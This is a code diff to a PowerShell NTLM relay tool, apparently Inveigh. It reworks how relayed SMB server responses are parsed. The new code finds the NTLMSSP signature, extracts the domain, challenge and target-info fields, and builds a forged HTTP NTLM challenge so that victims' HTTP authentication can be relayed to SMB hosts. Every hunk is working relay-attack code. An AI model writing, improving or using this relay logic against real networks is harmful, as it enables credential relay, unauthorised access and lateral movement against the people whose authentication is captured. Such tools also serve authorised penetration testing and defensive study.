@@ -488,7 +488,7 @@ $SMB_relay_challenge_scriptblock =
                 }
             }
 
-            $SMB_relay_challenge_stream.write($SMB_relay_challenge_send, 0, $SMB_relay_challenge_send.length)
+            $SMB_relay_challenge_stream.Write($SMB_relay_challenge_send, 0, $SMB_relay_challenge_send.length)
             $SMB_relay_challenge_stream.Flush()
             
             if($SMBRelayNetworkTimeout)
@@ -1011,16 +1011,24 @@ $HTTP_scriptblock =
                         $inveigh.SMB_relay_active_step = 2
                         $SMB_relay_bytes = $SMB_relay_bytes[2..$SMB_relay_bytes.length]
                         $SMB_user_ID = $SMB_relay_bytes[34..33]
-                        $SMB_relay_NTLM_challenge = $SMB_relay_bytes[102..109]
-                        $SMB_relay_target_details = $SMB_relay_bytes[118..257]
-                        $SMB_relay_time = $SMB_relay_bytes[258..265]
+                        $SMB_relay_NTLMSSP = [System.BitConverter]::ToString($SMB_relay_bytes)
+                        $SMB_relay_NTLMSSP = $SMB_relay_NTLMSSP -replace "-",""
+                        $SMB_relay_NTLMSSP_index = $SMB_relay_NTLMSSP.IndexOf("4E544C4D53535000")
+                        $SMB_relay_NTLMSSP_bytes_index = $SMB_relay_NTLMSSP_index / 2
+                        $SMB_domain_length = DataLength ($SMB_relay_NTLMSSP_bytes_index + 12) $SMB_relay_bytes
+                        $SMB_domain_length_offset_bytes = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 12)..($SMB_relay_NTLMSSP_bytes_index + 19)]
+                        $SMB_target_length = DataLength ($SMB_relay_NTLMSSP_bytes_index + 40) $SMB_relay_bytes
+                        $SMB_target_length_offset_bytes = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 40)..($SMB_relay_NTLMSSP_bytes_index + 55 + $SMB_domain_length)]
+                        $SMB_relay_NTLM_challenge = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 24)..($SMB_relay_NTLMSSP_bytes_index + 31)]
+                        $SMB_relay_target_details = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 56 + $SMB_domain_length)..($SMB_relay_NTLMSSP_bytes_index + 55 + $SMB_domain_length + $SMB_target_length)]
                     
-                        [byte[]] $HTTP_NTLM_bytes = (0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,0x00,0x00,0x00,0x05,0x82,0x89,0xa2)`
+                        [byte[]] $HTTP_NTLM_bytes = (0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00)`
+                            + $SMB_domain_length_offset_bytes`
+                            + (0x05,0x82,0x89,0xa2)`
                             + $SMB_relay_NTLM_challenge`
                             + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)`
-                            + $SMB_relay_target_details`
-                            + $SMB_relay_time`
-                            + (0x00,0x00,0x00,0x00)
+                            + $SMB_target_length_offset_bytes`
+                            + $SMB_relay_target_details
                     
                         $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
                         $NTLM = 'NTLM ' + $NTLM_challenge_base64
